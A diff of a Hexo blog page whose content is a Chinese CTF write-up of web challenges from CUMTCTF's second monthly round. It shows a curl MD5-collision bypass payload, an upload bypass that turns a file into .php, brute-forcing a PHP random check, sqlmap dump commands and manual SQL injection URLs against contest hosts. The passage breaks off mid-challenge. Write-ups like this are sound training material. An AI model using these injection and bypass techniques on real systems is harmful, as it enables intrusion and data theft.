@@ -1,131 +1,140 @@
-<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1"><meta name="format-detection" content="telephone=no"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-status-bar-style" content="black"><link rel="icon" href="/assets/avatar.jpg?v=2.1.1" type="image/png" sizes="16x16"><link rel="icon" href="/assets/avatar.jpg?v=2.1.1" type="image/png" sizes="32x32"><meta name="description" content="前言       本次题目比较简单，有幸ak了web，可惜还是没进前三，二进制和pwn做的太差了，区块链也没做出来，要是做出来就前三了，有时间还是要学习一下区块链。">
-<meta property="og:type" content="article">
-<meta property="og:title" content="CUMTCTF第二轮月赛">
-<meta property="og:url" content="http://chaosec.top/2019/01/30/cumtctf2/index.html">
-<meta property="og:site_name" content="Aesm1p&#39; Blog">
-<meta property="og:description" content="前言       本次题目比较简单，有幸ak了web，可惜还是没进前三，二进制和pwn做的太差了，区块链也没做出来，要是做出来就前三了，有时间还是要学习一下区块链。">
-<meta property="og:locale" content="en_US">
-<meta property="og:image" content="https://i.imgur.com/kDxBrxT.png">
-<meta property="og:image" content="https://i.loli.net/2019/01/24/5c49424c2fdc8.png">
-<meta property="og:image" content="https://i.loli.net/2019/01/24/5c4942d3766a8.png">
-<meta property="og:image" content="https://i.loli.net/2019/01/26/5c4c5df37356a.png">
-<meta property="og:image" content="https://i.loli.net/2019/01/26/5c4c5e68be087.png">
-<meta property="og:image" content="https://i.loli.net/2019/01/26/5c4c5e99549bc.png">
-<meta property="og:image" content="https://i.loli.net/2019/01/26/5c4c5eea0c492.png">
-<meta property="og:image" content="https://i.loli.net/2019/01/26/5c4c5f1453698.png">
-<meta property="og:image" content="https://i.loli.net/2019/01/26/5c4c5f7396879.png">
-<meta property="og:image" content="https://i.loli.net/2019/01/26/5c4c5f7398de3.png">
-<meta property="og:image" content="https://i.loli.net/2019/01/27/5c4d642c02f24.png">
-<meta property="og:image" content="https://i.loli.net/2019/01/27/5c4d642bedc54.png">
-<meta property="og:image" content="https://i.imgur.com/jPfKQ85.png">
-<meta property="og:image" content="https://i.loli.net/2019/01/29/5c4fc4c6822ca.png">
-<meta property="og:image" content="https://i.loli.net/2019/01/29/5c4fc69264c59.png">
-<meta property="og:image" content="https://i.loli.net/2019/01/25/5c4a720c0a5e5.png">
-<meta property="og:image" content="https://i.loli.net/2019/01/27/5c4d21fd3ea8c.png">
-<meta property="og:image" content="https://i.loli.net/2019/01/28/5c4f1b9f3be88.png">
-<meta property="og:image" content="https://i.loli.net/2019/01/28/5c4f1ade58965.png">
-<meta property="og:image" content="https://i.loli.net/2019/01/28/5c4f1c7412770.png">
-<meta property="og:image" content="https://i.loli.net/2019/01/28/5c4f1a3be6535.png">
-<meta property="og:image" content="https://i.loli.net/2019/01/28/5c4f1a6c49e42.png">
-<meta property="og:image" content="https://i.loli.net/2019/01/28/5c4f1be73b91e.png">
-<meta property="og:image" content="https://i.loli.net/2019/01/28/5c4f1ab4dec43.png">
-<meta property="article:published_time" content="2019-01-30T14:50:00.000Z">
-<meta property="article:modified_time" content="2019-02-12T14:29:27.946Z">
-<meta property="article:author" content="Aesm1p">
-<meta property="article:tag" content="CTF">
-<meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://i.imgur.com/kDxBrxT.png"><title>CUMTCTF第二轮月赛 | Aesm1p' Blog</title><link ref="canonical" href="http://chaosec.top/2019/01/30/cumtctf2/"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.12.1/css/all.min.css" type="text/css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css" type="text/css"><link rel="stylesheet" href="/css/index.css?v=2.1.1"><script>var Stun = window.Stun || {};
-var CONFIG = {
-  root: '/',
-  algolia: undefined,
-  fontIcon: {"prompt":{"success":"fas fa-check-circle","info":"fas fa-arrow-circle-right","warning":"fas fa-exclamation-circle","error":"fas fa-times-circle"},"copyBtn":"fas fa-copy"},
-  sidebar: undefined,
-  header: {"enable":true,"showOnPost":false,"scrollDownIcon":true},
-  postWidget: {"endText":true},
-  nightMode: {"enable":true},
-  back2top: {"enable":true},
-  codeblock: {"style":"carbon","highlight":"light","wordWrap":false},
-  reward: true,
-  fancybox: true,
-  zoomImage: {"gapAside":"50px"},
-  galleryWaterfall: undefined,
-  lazyload: false,
-  pjax: undefined,
-  externalLink: {"icon":{"enable":true,"name":"fas fa-external-link-alt"}},
-  shortcuts: undefined,
-  prompt: {"copyButton":"Copy","copySuccess":"Copy Success","copyError":"Copy Error"},
-  sourcePath: {"js":"js","css":"css","images":"images"},
-};
+<!DOCTYPE HTML>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>CUMTCTF第二轮月赛 | Aesm1p&#39;s Blog | 前方如聂鲁达的爱情诗一般美好</title>
 
-window.CONFIG = CONFIG;</script><meta name="generator" content="Hexo 4.2.1"></head><body><div class="container" id="container"><header class="header" id="header"><div class="header-inner header-inner--height header-inner--bgcolor"><nav class="header-nav header-nav--sticky"><div class="header-nav-inner"><div class="header-nav-menubtn"><i class="fas fa-bars"></i></div><div class="header-nav-menu"><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/"><span class="header-nav-menu-item__icon"><i class="fas fa-home"></i></span><span class="header-nav-menu-item__text">Home</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="javascript:;" onclick="return false;"><span class="header-nav-menu-item__icon"><i class="fas fa-shapes"></i></span><span class="header-nav-menu-item__text">Article</span></a><div class="header-nav-submenu"><div class="header-nav-submenu-item"><a class="header-nav-submenu-item__link" href="/archives/"><span class="header-nav-submenu-item__icon"><i class="fas fa-folder-open"></i></span><span class="header-nav-submenu-item__text">Archives</span></a></div><div class="header-nav-submenu-item"><a class="header-nav-submenu-item__link" href="/categories/"><span class="header-nav-submenu-item__icon"><i class="fab fa-buffer"></i></span><span class="header-nav-submenu-item__text">Categories</span></a></div><div class="header-nav-submenu-item"><a class="header-nav-submenu-item__link" href="/tags/"><span class="header-nav-submenu-item__icon"><i class="fas fa-tags"></i></span><span class="header-nav-submenu-item__text">Tags</span></a></div></div></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/about/"><span class="header-nav-menu-item__icon"><i class="fas fa-address-card"></i></span><span class="header-nav-menu-item__text">About</span></a></div></div><div class="header-nav-search"><span class="header-nav-search__icon"><i class="fas fa-search"></i></span><span class="header-nav-search__text">Search</span></div><div class="header-nav-mode"><div class="mode"><div class="mode-track"><span class="mode-track-moon"></span><span class="mode-track-sun"></span></div><div class="mode-thumb"></div></div></div></div></nav></div></header><main class="main" id="main"><div class="main-inner"><div class="content-wrap" id="content-wrap"><div class="content" id="content"><!-- Just used to judge whether it is an article page--><div id="is-post"></div><div class="post"><header class="post-header"><h1 class="post-title">CUMTCTF第二轮月赛</h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon" data-popover="Created Time" data-popover-pos="up"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__value">2019-01-30</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon" data-popover="Updated Time" data-popover-pos="up"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__value">2019-02-12</span></span><span class="post-meta-item post-meta-item--wordcount"><span class="post-meta-item__icon" data-popover="Words Count" data-popover-pos="up"><i class="far fa-file-word"></i></span><span class="post-meta-item__value">3,750</span></span><span class="post-meta-item post-meta-item--readtime"><span class="post-meta-item__icon" data-popover="Reading Time" data-popover-pos="up"><i class="far fa-clock"></i></span><span class="post-meta-item__value">32m</span></span></div></header><div class="post-body">
-        <h1 id="前言">
-          <a href="#前言" class="heading-link"><i class="fas fa-link"></i></a>前言</h1>
-      <p>本次题目比较简单，有幸ak了web，可惜还是没进前三，二进制和pwn做的太差了，区块链也没做出来，要是做出来就前三了，有时间还是要学习一下区块链。</p>
-<a id="more"></a>
+  
+  <meta name="author" content="Aesm1p">
+  
 
-        <h1 id="web">
-          <a href="#web" class="heading-link"><i class="fas fa-link"></i></a>web</h1>
+  
+  <meta name="description" content="相逢意气为君饮">
+  
+
+  
+  
+  <meta name="keywords" content="CTF">
+  
+
+  <meta id="viewport" name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, minimum-scale=1, user-scalable=no, minimal-ui">
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <meta name="apple-mobile-web-app-status-bar-style" content="black">
+
+  <meta property="og:title" content="CUMTCTF第二轮月赛"/>
+
+  <meta property="og:site_name" content="Aesm1p&#39;s Blog"/>
+
+  
+  <meta property="og:image" content="/favicon.ico"/>
+  
+
+  <link href="/favicon.ico" rel="icon">
+  <link rel="alternate" href="/atom.xml" title="Aesm1p&#39;s Blog" type="application/atom+xml">
+  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
+<meta name="generator" content="Hexo 4.2.1"></head>
+
+
+<body>
+<div class="blog">
+  <div class="content">
+
+    <header>
+  <div class="site-branding">
+    <h1 class="site-title">
+      <a href="/">Aesm1p&#39;s Blog</a>
+    </h1>
+    <p class="site-description">前方如聂鲁达的爱情诗一般美好</p>
+  </div>
+  <nav class="site-navigation">
+    <ul>
       
-        <h2 id="签到题">
-          <a href="#签到题" class="heading-link"><i class="fas fa-link"></i></a>签到题</h2>
-      <figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">$white_list = range(<span class="number">0</span>,<span class="number">9</span>); </span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">'flag.php'</span>); </span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_REQUEST[<span class="string">'0ver'</span>]) &amp;&amp; <span class="keyword">isset</span>($_REQUEST[<span class="string">'0ver1'</span>]) &amp;&amp; <span class="keyword">isset</span>($_REQUEST[<span class="string">'0ver2'</span>]))&#123; </span><br><span class="line">    $a = $_REQUEST[<span class="string">'0ver'</span>]; </span><br><span class="line">    $b = $_REQUEST[<span class="string">'0ver1'</span>]; </span><br><span class="line">    $c = $_REQUEST[<span class="string">'0ver2'</span>]; </span><br><span class="line">    <span class="keyword">if</span>(@ereg(<span class="string">"^[0-9]+$"</span>, $a) === <span class="keyword">FALSE</span>)&#123; </span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'no must be number'</span>; </span><br><span class="line">    &#125;<span class="keyword">else</span>&#123; </span><br><span class="line">        <span class="keyword">if</span>(in_array($a,$white_list))&#123; </span><br><span class="line">            <span class="keyword">if</span>(strlen($a)&gt;<span class="number">1</span>)&#123; </span><br><span class="line">                <span class="keyword">if</span>(md5($c) === md5($b) &amp;&amp; ($b !== $c))&#123; </span><br><span class="line">                    <span class="keyword">echo</span> <span class="string">"&lt;img src='dark.png'&gt;&lt;br&gt;"</span>; </span><br><span class="line">                    <span class="keyword">echo</span> <span class="string">'you are a great dark phper&lt;br&gt;'</span>; </span><br><span class="line">                    <span class="keyword">echo</span> $flag; </span><br><span class="line">                &#125; </span><br><span class="line">                <span class="keyword">else</span>&#123; </span><br><span class="line">                    <span class="keyword">echo</span> <span class="string">"you can do it!!!"</span>; </span><br><span class="line">                &#125; </span><br><span class="line">                 </span><br><span class="line">            &#125;<span class="keyword">else</span>&#123; </span><br><span class="line">                <span class="keyword">echo</span> <span class="string">'you no dark'</span>; </span><br><span class="line">            &#125; </span><br><span class="line">        &#125;<span class="keyword">else</span>&#123; </span><br><span class="line">            <span class="keyword">echo</span> <span class="string">'you are so dark'</span>; </span><br><span class="line">        &#125; </span><br><span class="line">    &#125;     </span><br><span class="line">&#125;<span class="keyword">else</span> </span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></div></figure>
+        <li><a href="/">HOME</a></li>
+      
+        <li><a href="/archives">ARCHIVES</a></li>
+      
+        <li><a href="/tags">TAGS</a></li>
+      
+        <li><a href="/about">ABOUT</a></li>
+      
+    </ul>
+  </nav>
+</header>
+
+    <main class="site-main posts-loop">
+    <article>
+
+  
+    
+    <h3 class="article-title"><span>CUMTCTF第二轮月赛</span></h3>
+    
+  
+
+  <div class="article-top-meta">
+    <span class="posted-on">
+      <a href="/2019/01/30/cumtctf2/" rel="bookmark">
+        <time class="entry-date published" datetime="2019-01-30T14:50:00.000Z">
+          2019-01-30
+        </time>
+      </a>
+    </span>
+  </div>
+
+
+  
+
+  <div class="article-content">
+    <div class="entry">
+      
+        <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>本次题目比较简单，有幸ak了web，可惜还是没进前三，二进制和pwn做的太差了，区块链也没做出来，要是做出来就前三了，有时间还是要学习一下区块链。</p>
+<a id="more"></a>
+<h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><h2 id="签到题"><a href="#签到题" class="headerlink" title="签到题"></a>签到题</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">$white_list = range(<span class="number">0</span>,<span class="number">9</span>); </span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">'flag.php'</span>); </span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_REQUEST[<span class="string">'0ver'</span>]) &amp;&amp; <span class="keyword">isset</span>($_REQUEST[<span class="string">'0ver1'</span>]) &amp;&amp; <span class="keyword">isset</span>($_REQUEST[<span class="string">'0ver2'</span>]))&#123; </span><br><span class="line">    $a = $_REQUEST[<span class="string">'0ver'</span>]; </span><br><span class="line">    $b = $_REQUEST[<span class="string">'0ver1'</span>]; </span><br><span class="line">    $c = $_REQUEST[<span class="string">'0ver2'</span>]; </span><br><span class="line">    <span class="keyword">if</span>(@ereg(<span class="string">"^[0-9]+$"</span>, $a) === <span class="keyword">FALSE</span>)&#123; </span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'no must be number'</span>; </span><br><span class="line">    &#125;<span class="keyword">else</span>&#123; </span><br><span class="line">        <span class="keyword">if</span>(in_array($a,$white_list))&#123; </span><br><span class="line">            <span class="keyword">if</span>(strlen($a)&gt;<span class="number">1</span>)&#123; </span><br><span class="line">                <span class="keyword">if</span>(md5($c) === md5($b) &amp;&amp; ($b !== $c))&#123; </span><br><span class="line">                    <span class="keyword">echo</span> <span class="string">"&lt;img src='dark.png'&gt;&lt;br&gt;"</span>; </span><br><span class="line">                    <span class="keyword">echo</span> <span class="string">'you are a great dark phper&lt;br&gt;'</span>; </span><br><span class="line">                    <span class="keyword">echo</span> $flag; </span><br><span class="line">                &#125; </span><br><span class="line">                <span class="keyword">else</span>&#123; </span><br><span class="line">                    <span class="keyword">echo</span> <span class="string">"you can do it!!!"</span>; </span><br><span class="line">                &#125; </span><br><span class="line">                 </span><br><span class="line">            &#125;<span class="keyword">else</span>&#123; </span><br><span class="line">                <span class="keyword">echo</span> <span class="string">'you no dark'</span>; </span><br><span class="line">            &#125; </span><br><span class="line">        &#125;<span class="keyword">else</span>&#123; </span><br><span class="line">            <span class="keyword">echo</span> <span class="string">'you are so dark'</span>; </span><br><span class="line">        &#125; </span><br><span class="line">    &#125;     </span><br><span class="line">&#125;<span class="keyword">else</span> </span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure>
 <p>很简单的代码审计题目，第一次绕过要求0ver是数字0-9以内的整数，但是长度却要大于1位，使用 <code>03</code>类似的即可绕过，也可以使用<code>%00</code>截断，第二层要求两个相同md5值的文件（不是弱类型比较），这样的文件也是有的，记得强网杯好像就有类似的题目，参考一下即可</p>
 <p>paylaod：</p>
-<figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -v http:&#x2F;&#x2F;202.119.201.199:32790?0ver&#x3D;02 --data &quot;0ver1&#x3D;M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%00%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1U%5D%83%60%FB_%07%FE%A2&amp;0ver2&#x3D;M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%02%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1%D5%5D%83%60%FB_%07%FE%A2&quot;</span><br></pre></td></tr></table></div></figure>
-<figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag:flag&#123;73100259ca8919f402846b00d3b939a9&#125;</span><br></pre></td></tr></table></div></figure>
-
-        <h2 id="SimpleUpload">
-          <a href="#SimpleUpload" class="heading-link"><i class="fas fa-link"></i></a>SimpleUpload</h2>
-      <p>查看源码可知发现前端验证设置了白名单，只允许上传.jpg|.png|.gif。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -v http:&#x2F;&#x2F;202.119.201.199:32790?0ver&#x3D;02 --data &quot;0ver1&#x3D;M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%00%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1U%5D%83%60%FB_%07%FE%A2&amp;0ver2&#x3D;M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%02%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1%D5%5D%83%60%FB_%07%FE%A2&quot;</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag:flag&#123;73100259ca8919f402846b00d3b939a9&#125;</span><br></pre></td></tr></table></figure>
+<h2 id="SimpleUpload"><a href="#SimpleUpload" class="headerlink" title="SimpleUpload"></a>SimpleUpload</h2><p>查看源码可知发现前端验证设置了白名单，只允许上传.jpg|.png|.gif。</p>
 <p>这里需要绕过前端验证，上传1.jpg，利用burp截断修改后缀名为1.php。</p>
 <p><img src="https://i.imgur.com/kDxBrxT.png" alt>    </p>
-
-        <h2 id="小型线上赌场">
-          <a href="#小型线上赌场" class="heading-link"><i class="fas fa-link"></i></a>小型线上赌场</h2>
-      <p>题目提示了断电，应该是vi文件泄露，测试发现 <code>.index.swp</code>存在泄露，vim恢复一下</p>
-<figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vi -r index.swp</span><br></pre></td></tr></table></div></figure>
+<h2 id="小型线上赌场"><a href="#小型线上赌场" class="headerlink" title="小型线上赌场"></a>小型线上赌场</h2><p>题目提示了断电，应该是vi文件泄露，测试发现 <code>.index.swp</code>存在泄露，vim恢复一下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vi -r index.swp</span><br></pre></td></tr></table></figure>
 <p>代码如下</p>
-<figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    $invest = $_GET[<span class="string">'invest'</span>];</span><br><span class="line">    $rand = rand(<span class="number">2</span>,<span class="number">50</span>);</span><br><span class="line">    $len = strlen(trim($_GET[<span class="string">'invest'</span>]));</span><br><span class="line">    <span class="keyword">foreach</span> ($_GET <span class="keyword">as</span> $key =&gt; $value) &#123;</span><br><span class="line">        <span class="keyword">if</span>(!is_numeric($value)||$value == <span class="string">'0'</span>)&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">'no no no!'</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    $money = number_format($invest*$rand);</span><br><span class="line">    $money = intval(str_replace(<span class="string">','</span>,<span class="string">''</span>,$money));</span><br><span class="line">    $guess = intval($_GET[<span class="string">'guess'</span>]);</span><br><span class="line">    <span class="keyword">if</span> ($guess == $money &amp;&amp; strlen($money)===$len) &#123;</span><br><span class="line">        <span class="keyword">echo</span> $flag;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    $invest = $_GET[<span class="string">'invest'</span>];</span><br><span class="line">    $rand = rand(<span class="number">2</span>,<span class="number">50</span>);</span><br><span class="line">    $len = strlen(trim($_GET[<span class="string">'invest'</span>]));</span><br><span class="line">    <span class="keyword">foreach</span> ($_GET <span class="keyword">as</span> $key =&gt; $value) &#123;</span><br><span class="line">        <span class="keyword">if</span>(!is_numeric($value)||$value == <span class="string">'0'</span>)&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">'no no no!'</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    $money = number_format($invest*$rand);</span><br><span class="line">    $money = intval(str_replace(<span class="string">','</span>,<span class="string">''</span>,$money));</span><br><span class="line">    $guess = intval($_GET[<span class="string">'guess'</span>]);</span><br><span class="line">    <span class="keyword">if</span> ($guess == $money &amp;&amp; strlen($money)===$len) &#123;</span><br><span class="line">        <span class="keyword">echo</span> $flag;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 <p>代码思路是提交invest值，然后乘以一个2-50之间的随机数与我们猜测的相等即可得到flag，直接多次尝试爆破即可，即每次都提交invest值为2，guess值为6，只要某次随机数为3的时候即可得到flag</p>
 <p><img src="https://i.loli.net/2019/01/24/5c49424c2fdc8.png" alt="抓包爆破"></p>
 <p><img src="https://i.loli.net/2019/01/24/5c4942d3766a8.png" alt="flag"></p>
-<figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;7e1e2bfe75c980be35c61ed1bde7a6f2&#125;</span><br></pre></td></tr></table></div></figure>
-
-        <h2 id="SimpleSQLi">
-          <a href="#SimpleSQLi" class="heading-link"><i class="fas fa-link"></i></a>SimpleSQLi</h2>
-      <figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u http:&#x2F;&#x2F;bxs.cumt.edu.cn:30007&#x2F;test&#x2F;index.php?id&#x3D;1 --dbs</span><br></pre></td></tr></table></div></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;7e1e2bfe75c980be35c61ed1bde7a6f2&#125;</span><br></pre></td></tr></table></figure>
+<h2 id="SimpleSQLi"><a href="#SimpleSQLi" class="headerlink" title="SimpleSQLi"></a>SimpleSQLi</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u http:&#x2F;&#x2F;bxs.cumt.edu.cn:30007&#x2F;test&#x2F;index.php?id&#x3D;1 --dbs</span><br></pre></td></tr></table></figure>
 <p>数据库名为security</p>
-<figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u http:&#x2F;&#x2F;bxs.cumt.edu.cn:30007&#x2F;test&#x2F;index.php?id&#x3D;1 -D security --tables</span><br></pre></td></tr></table></div></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u http:&#x2F;&#x2F;bxs.cumt.edu.cn:30007&#x2F;test&#x2F;index.php?id&#x3D;1 -D security --tables</span><br></pre></td></tr></table></figure>
 <p>表名flagishere</p>
-<figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u http:&#x2F;&#x2F;bxs.cumt.edu.cn:30007&#x2F;test&#x2F;index.php?id&#x3D;1 -D security -T flagishere --columns --threads&#x3D;10</span><br></pre></td></tr></table></div></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u http:&#x2F;&#x2F;bxs.cumt.edu.cn:30007&#x2F;test&#x2F;index.php?id&#x3D;1 -D security -T flagishere --columns --threads&#x3D;10</span><br></pre></td></tr></table></figure>
 <p>列名id,flag</p>
-<figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u http:&#x2F;&#x2F;bxs.cumt.edu.cn:30007&#x2F;test&#x2F;index.php?id&#x3D;1 -D security -T flagishere -C &quot;id,flag&quot; --dump --threads&#x3D;10</span><br></pre></td></tr></table></div></figure>
-<figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;4ur0Ra_SimPlE_sQLi_23333&#125;</span><br></pre></td></tr></table></div></figure>
-
-        <h2 id="真的简单。。">
-          <a href="#真的简单。。" class="heading-link"><i class="fas fa-link"></i></a>真的简单。。</h2>
-      <p>随手fuzz一下</p>
-<figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;202.119.201.199:32793&#x2F;list.php?id&#x3D;1%27</span><br></pre></td></tr></table></div></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u http:&#x2F;&#x2F;bxs.cumt.edu.cn:30007&#x2F;test&#x2F;index.php?id&#x3D;1 -D security -T flagishere -C &quot;id,flag&quot; --dump --threads&#x3D;10</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;4ur0Ra_SimPlE_sQLi_23333&#125;</span><br></pre></td></tr></table></figure>
+<h2 id="真的简单。。"><a href="#真的简单。。" class="headerlink" title="真的简单。。"></a>真的简单。。</h2><p>随手fuzz一下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;202.119.201.199:32793&#x2F;list.php?id&#x3D;1%27</span><br></pre></td></tr></table></figure>
 <p>报错</p>
-<figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;202.119.201.199:32793&#x2F;list.php?id&#x3D;1%27--+</span><br></pre></td></tr></table></div></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;202.119.201.199:32793&#x2F;list.php?id&#x3D;1%27--+</span><br></pre></td></tr></table></figure>
 <p>可以正常返回，猜测是单引号注入</p>
-<figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;202.119.201.199:32793&#x2F;list.php?id&#x3D;-1%27%20or%201&#x3D;1--+</span><br></pre></td></tr></table></div></figure>
